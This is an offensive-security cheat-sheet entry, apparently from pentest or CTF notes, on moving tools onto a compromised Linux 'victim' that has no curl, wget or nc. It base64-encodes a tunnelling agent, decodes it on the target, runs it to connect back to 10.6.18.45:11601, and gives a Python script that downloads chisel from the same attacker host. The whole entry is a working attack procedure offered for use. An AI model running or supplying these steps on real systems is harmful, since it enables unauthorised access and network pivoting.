---
title: File Transfer via base64 (No curl/wget/nc)
category: tunnels
subcategory: file-transfer
os: linux
command: base64 file > file.b64
tools: tar, base64, xclip
---


When the victim has no curl/wget/nc and bash piping would corrupt binary integrity.

### Encode on Kali

```bash
tar -caf agent.tar.xz agent
base64 agent.tar.xz > agent.tar.xz.b64
xclip -sel clip agent.tar.xz.b64
```

### Decode on victim

```bash
echo "ENTIRE_BASE64_PAYLOAD" | base64 -d > agent.tar.xz
tar -xaf agent.tar.xz
chmod 777 agent
./agent -connect 10.6.18.45:11601 -ignore-cert
```

### Pure-Python downloader (alternative)

If Python is available but `curl`/`wget` are missing:

```python
import urllib.request

url = 'http://10.6.18.45/chisel'
output_file = 'chisel'

try:
    with urllib.request.urlopen(url) as response, open(output_file, 'wb') as out_file:
        out_file.write(response.read())
    print(f"Downloaded {url} to {output_file}")
except Exception as e:
    print(f"Failed to download {url}: {e}")
```

Encode the script and reconstitute on the victim:

```bash
cat test.py | base64 > decoded.txt
```

```bash
echo "BASE64_OF_test_py" | base64 -d > test.py
python3 test.py
```
